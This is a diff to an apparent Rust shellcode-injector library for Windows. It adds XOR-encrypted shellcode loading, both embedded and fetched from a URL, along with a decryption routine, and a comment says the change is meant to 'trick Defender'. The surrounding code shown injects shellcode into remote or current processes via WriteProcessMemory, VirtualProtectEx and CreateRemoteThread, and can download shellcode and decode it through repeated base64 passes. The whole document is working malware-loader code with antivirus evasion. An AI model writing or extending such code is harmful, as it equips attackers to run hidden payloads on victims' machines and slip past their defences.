@@ -10,7 +10,7 @@ use base64::{engine::general_purpose, Engine as _};
 use reqwest::blocking::get;
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::Win32::{
-    Foundation::{CloseHandle, GetLastError, BOOL, HANDLE, WIN32_ERROR},
+    Foundation::{CloseHandle, GetLastError, BOOL, HANDLE, WAIT_EVENT},
     System::{
         Diagnostics::Debug::WriteProcessMemory,
         Memory::{
@@ -43,12 +43,18 @@ pub struct Injector {
 /// * `Base64Embedded`: Instead of a raw [Vec], you use b64
 ///    (n-iterations) to create an obfuscated shellcode string,
 ///    which will be decoded at runtime
+/// *  `XorEmbedded`: Embedded shellcode with a seconde [Vec<u8>] as a decryption key. Not really
+/// secure, but it'll trick Defender.
+/// *  `XorUrl`: Pulls the XORed shellcode from the URL, and uses the provided [Vec<u8>] for decryption.
+///
 ///
 pub enum InjectorType {
     Url(String),
     Base64Url((String, usize)),
     Embedded(Vec<u8>),
     Base64Embedded((String, usize)),
+    XorEmbedded((Vec<u8>, Vec<u8>)),
+    XorUrl((String, Vec<u8>)),
 }
 
 ///
@@ -64,6 +70,10 @@ pub enum InjectionType {
 /// The generic function to write memory to either
 /// our own our another process, depending on the handle.
 ///
+/// ## Safety
+///
+/// YOYO
+///
 pub unsafe fn write_mem(
     sc: Vec<u8>,
     proc_h: HANDLE,
@@ -72,7 +82,7 @@ pub unsafe fn write_mem(
 ) -> Result<(), String> {
     let sc_len = sc.len();
     let mut n = 0;
-    WriteProcessMemory(proc_h, base_addr, sc.as_ptr() as _, sc_len, Some(&mut n));
+    WriteProcessMemory(proc_h, base_addr, sc.as_ptr() as _, sc_len, Some(&mut n)).unwrap();
 
     let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
     VirtualProtectEx(
@@ -81,7 +91,8 @@ pub unsafe fn write_mem(
         sc_len,
         PAGE_EXECUTE_READ,
         &mut old_protect,
-    );
+    )
+    .unwrap();
 
     let h_thread = CreateRemoteThread(
         proc_h,
@@ -94,10 +105,10 @@ pub unsafe fn write_mem(
     )
     .unwrap();
 
-    CloseHandle(proc_h);
+    CloseHandle(proc_h).unwrap();
 
     if wait {
-        if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
+        if WaitForSingleObject(h_thread, INFINITE) == WAIT_EVENT(0) {
             println!("Good!");
             println!("Injection completed!");
             Ok(())
@@ -114,6 +125,10 @@ pub unsafe fn write_mem(
 ///
 /// Performs reflective injection.
 ///  
+/// ## Safety
+///
+/// YOYO
+///
 pub unsafe fn reflective_inject(sc: Vec<u8>, wait: bool) -> Result<(), String> {
     let h: HANDLE = GetCurrentProcess();
     let addr = VirtualAllocEx(
@@ -132,6 +147,10 @@ pub unsafe fn reflective_inject(sc: Vec<u8>, wait: bool) -> Result<(), String> {
 ///
 /// Will attempt to find a process with the given name and inject.
 ///  
+/// ## Safety
+///
+/// YOYO
+///
 pub unsafe fn remote_inject(sc: Vec<u8>, wait: bool, process_name: &str) -> Result<(), String> {
     // Enumerate processes
     let sys = System::new_all();
@@ -169,6 +188,9 @@ pub fn download_shellcode(url: &str) -> Result<Vec<u8>, String> {
     }
 }
 
+///
+/// Decodes base64 shellcode for `b64_iterations`.
+///
 pub fn decode_b64_shellcode(sc: &Vec<u8>, b64_iterations: usize) -> Result<Vec<u8>, String> {
     let mut shellcode_vec: Vec<u8> = sc.to_vec();
     for _i in 0..b64_iterations {
@@ -185,3 +207,15 @@ pub fn decode_b64_shellcode(sc: &Vec<u8>, b64_iterations: usize) -> Result<Vec<u
     Ok(shellcode_vec)
 }
 
+///
+/// Simple XOR decryption
+///
+pub fn decrypt_xor(sc: &Vec<u8>, key: &Vec<u8>) -> Result<Vec<u8>, String> {
+    let mut decrypted = Vec::with_capacity(sc.len());
+    let mut i = 0;
+    while i < sc.len() {
+        decrypted.push(sc[i] ^ key[i % key.len()]);
+        i += 1;
+    }
+    Ok(decrypted)
+}
